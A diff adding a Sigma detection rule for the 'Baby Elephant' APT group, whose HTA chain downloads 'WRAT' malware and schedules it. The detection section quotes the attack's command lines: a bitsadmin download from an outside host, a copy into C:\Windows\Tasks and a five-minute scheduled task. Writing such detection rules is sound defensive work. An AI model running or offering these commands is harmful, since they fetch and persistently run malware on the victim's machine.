@@ -1,0 +1,24 @@
+title: Baby Elephant APT Group Detection
+description: The malicious HTA script is executed through the built-in MSHTA tool of the Windows system. and the second stage malicious HTA script will be linked. The attacker downloads the malicious payload hosting server "WRAT" malware and creates a scheduled task to launch the "WRAT" malware at regular intervals
+author: Furkan Celik
+status: stable
+date: 2021/02/24
+references:
+- https://mp.weixin.qq.com/s/y2kRbYCt94yPu-5jtcZ_AA
+tags:
+- attack.T1059
+- attack.T1059.001
+- attack.Execution
+level: critical
+logsource:
+  product: windows
+  service: powershell
+detection:
+  condition: selection
+  selection:
+    CommandLine|contains:
+    - cmd.exe /c schtasks /CREATE /RU /SC Minute /MO 5 /TR C:\Windows\Tasks\HttpService.exe /TN HTTPService /F
+    - cmd.exe /c bitsadmin.exe /transfer j http://support-gov.myftp.org/httpserv C:\users\public\httpserv
+    - cmd.exe /c Copy C:\users\public\httpserv C:\Windows\Tasks\HttpService.exe /y
+fields:
+- CommandLine
